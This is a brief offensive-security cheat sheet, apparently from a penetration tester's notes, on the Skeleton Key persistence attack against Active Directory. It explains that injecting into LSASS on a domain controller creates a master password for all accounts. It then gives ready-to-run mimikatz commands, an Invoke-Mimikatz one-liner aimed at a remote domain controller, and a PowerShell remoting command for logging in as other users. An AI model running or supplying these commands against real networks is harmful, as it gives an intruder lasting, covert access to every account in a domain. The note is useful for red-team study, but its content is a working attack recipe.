# Domain Persistance - Skeleton key

A Skeleton key is like a malware that is injected into LSASS process of Domain controller (DC), for this to achieve we need to be a domain admin in order to perfrom this , doing this will create a master password for all accounts in a domain ,existing passwords for those account will still work, this attack is done through `mimikatz`. The master password will not change until DC is rebooted 

## mimikatz.exe

```
privilege::debug
misc::skeleton
```


## Mimikatz powershell
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -Computer computername.domain
```

Then we can just switch to other user

```
Enter-PSSession -ComputerName computername -Credential
```
